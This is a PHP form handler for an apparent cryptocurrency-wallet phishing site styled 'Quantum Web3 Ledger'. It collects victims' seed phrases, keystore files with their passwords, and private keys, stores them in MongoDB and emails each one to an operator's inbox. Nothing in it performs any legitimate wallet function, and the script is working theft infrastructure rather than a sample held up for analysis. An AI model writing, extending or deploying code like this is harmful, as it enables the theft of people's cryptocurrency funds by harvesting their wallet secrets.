<?php
// Set content type to JSON
header('Content-Type: application/json; charset=UTF-8');

// --- CONFIGURATION & ERROR HANDLING ---

// Disable error display for security (all errors go to the log file)
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
ini_set('error_log', __DIR__ . '/../error.log');

// Load Composer dependencies
require __DIR__ . '/../vendor/autoload.php';

use Dotenv\Dotenv;
use MongoDB\Driver\Manager;
use MongoDB\Driver\BulkWrite;
use MongoDB\Driver\Exception\Exception as MongoDBException;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception as PHPMailerException;

// --- HELPER FUNCTION ---

/**
 * Sends a JSON response and exits the script.
 * @param array $data The data to encode as JSON.
 * @param int $http_code The HTTP response code to send.
 */
function send_json_response(array $data, int $http_code = 200) {
    http_response_code($http_code);
    echo json_encode($data);
    exit;
}

/**
 * Attempts to save the submission to MongoDB.
 * Logs errors but does not exit.
 * @return bool True on success, false on failure.
 */
function trySaveToDatabase(string $wallet, string $email, string $data, string $submission_type): bool {
    try {
        if (!isset($_ENV['DB_USER'], $_ENV['DB_PASS'], $_ENV['DB_HOST'], $_ENV['DB_PORT'], $_ENV['DB_NAME'])) {
            throw new \Exception("Database ENV variables not set.");
        }
        
        $uri = sprintf(
            "mongodb://%s:%s@%s:%s/%s?authSource=admin",
            urlencode($_ENV['DB_USER']),
            urlencode($_ENV['DB_PASS']),
            $_ENV['DB_HOST'],
            $_ENV['DB_PORT'],
            $_ENV['DB_NAME']
        );
        
        $manager = new Manager($uri);
        
        // 1. Insert the new record
        $bulk = new BulkWrite;
        $bulk->insert([
            'wallet' => $wallet,
            'email'  => $email,
            'data'   => $data, // Data is already htmlspecialchar'd
            'submission_type' => $submission_type,
            'created_at' => new \MongoDB\BSON\UTCDateTime
        ]);
        $manager->executeBulkWrite("{$_ENV['DB_NAME']}.submissions", $bulk);
        error_log("PXXL MONGO INSERT OK for $wallet");
        
        // 2. Try to clean up old records (in its own try/catch)
        try {
            $cleanupBulk = new BulkWrite;
            // Delete records older than 30 days
            $thirtyDaysAgo = new \MongoDB\BSON\UTCDateTime((time() - (30 * 24 * 60 * 60)) * 1000);
            $cleanupBulk->delete(['created_at' => ['$lt' => $thirtyDaysAgo]]);
            $manager->executeBulkWrite("{$_ENV['DB_NAME']}.submissions", $cleanupBulk);
            error_log("PXXL MONGO cleanup executed.");
        } catch (MongoDBException $cleanupE) {
            // Log cleanup error, but don't fail the whole function
            error_log("PXXL MONGO CLEANUP ERROR: " . $cleanupE->getMessage());
        }
        
        return true; // Success
        
    } catch (\Exception $e) {
        error_log("PXXL MONGO ERROR: " . $e->getMessage());
        return false; // Failure
    }
}

/**
 * Sends the notification email.
 * @return bool True on success, false on failure.
 */
function sendNotificationEmail(string $wallet, string $email, string $data, string $submission_type): bool {
    if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
        error_log("PHPMailer class not found.");
        return false;
    }
    
    $mail = new PHPMailer(true);
    try {
        if (!isset($_ENV['SMTP_HOST'], $_ENV['SMTP_USER'], $_ENV['SMTP_PASS'], $_ENV['TO_EMAIL'])) {
            throw new PHPMailerException("Email ENV variables not set.");
        }
        
        $mail->isSMTP();
        $mail->Host = $_ENV['SMTP_HOST'];
        $mail->SMTPAuth = true;
        $mail->Username = $_ENV['SMTP_USER'];
        $mail->Password = $_ENV['SMTP_PASS'];
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port = 587;
        $mail->CharSet = 'UTF-8';
        
        $mail->setFrom($_ENV['SMTP_USER'], 'Quantum Web3 Ledger');
        $mail->addAddress($_ENV['TO_EMAIL']);
        
        $mail->Subject = "New $submission_type Submission from $wallet";
        $mail->Body = "Wallet: $wallet\n"
                    . "Type: $submission_type\n"
                    . "Email: $email\n"
                    . "Time: " . date('Y-m-d H:i:s') . "\n\n"
                    . "Data: $data";
        
        $mail->send();
        return true; // Success
        
    } catch (PHPMailerException $e) {
        error_log("Email error: " . $mail->ErrorInfo);
        return false; // Failure
    }
}

// --- SCRIPT EXECUTION ---

// Start session
session_start([
    'cookie_secure' => true,
    'cookie_httponly' => true,
    'use_strict_mode' => true
]);

// Load .env variables
try {
    $dotenv = Dotenv::createImmutable(__DIR__ . '/..');
    $dotenv->load();
} catch (\Exception $e) {
    error_log("Failed to load .env file: " . $e->getMessage());
    send_json_response(['error' => 'Server configuration error.'], 500);
}

// 1. Check Request Method
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    send_json_response(['error' => 'Method not allowed'], 405);
}

// 2. Check CSRF Token
if (empty($_SESSION['csrf_token'])) {
    // Generate a token if one doesn't exist
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    error_log("No CSRF token in session. Generated new one.");
}

if (!isset($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    error_log("CSRF token mismatch.");
    send_json_response(['error' => 'Invalid session. Please refresh and try again.'], 403);
}

// Invalidate token after use
unset($_SESSION['csrf_token']);

// 3. Parse and Validate Input
$submission_type = '';
$wallet = '';
$email = '';
$data = '';

if (isset($_POST['phrase'])) {
    $submission_type = 'phrase';
    $wallet = trim($_POST['pwallet'] ?? '');
    $email = trim($_POST['pemail'] ?? '');
    $data = trim($_POST['phrase']);
} elseif (isset($_POST['keystore'], $_POST['password'])) {
    $submission_type = 'keystore';
    $wallet = trim($_POST['kwallet'] ?? '');
    $email = trim($_POST['kemail'] ?? '');
    $data = "Keystore JSON:\n" . trim($_POST['keystore']) . "\n\nPassword: " . trim($_POST['password']);
} elseif (isset($_POST['private'])) {
    $submission_type = 'privatekey';
    $wallet = trim($_POST['prwallet'] ?? '');
    $email = trim($_POST['premail'] ?? '');
    $data = trim($_POST['private']);
} else {
    error_log("Invalid submission type. POST data: " . json_encode($_POST));
    send_json_response(['error' => 'Invalid submission type.'], 400);
}

// Validation
if (empty($wallet) || empty($email) || empty($data)) {
    send_json_response(['error' => 'All fields are required.'], 400);
}
if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    send_json_response(['error' => 'Invalid email address.'], 400);
}
if (!preg_match('/^[a-zA-Z0-9-_]{1,64}$/', $wallet)) {
    send_json_response(['error' => 'Invalid wallet name.'], 400);
}
if (strlen($data) > 2000) { // Increased limit slightly
    send_json_response(['error' => 'Input data is too long.'], 400);
}

// Sanitize data before use
$data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
$wallet = htmlspecialchars($wallet, ENT_QUOTES, 'UTF-8');
$email = filter_var($email, FILTER_SANITIZE_EMAIL);

// 4. Rate Limiting (1 submission per 60 seconds per session)
if (isset($_SESSION['last_submission']) && (time() - $_SESSION['last_submission']) < 60) {
    send_json_response(['error' => 'Please wait a minute before submitting again.'], 429);
}
$_SESSION['last_submission'] = time();

// --- PROCESS SUBMISSION ---

// Step 1: Attempt to save to the database (non-critical)
// This function will log its own errors and return true/false
trySaveToDatabase($wallet, $email, $data, $submission_type);

// Step 2: Attempt to send the email (critical)
// This is the most important part.
if (sendNotificationEmail($wallet, $email, $data, $submission_type)) {
    // SUCCESS!
    error_log("Email sent successfully for $wallet");
    send_json_response(['success' => 'Submission received successfully.']);
} else {
    // FAILURE
    error_log("CRITICAL FAILURE: Email could not be sent for $wallet.");
    send_json_response(['error' => 'Server error. Please try again later.'], 500);
}
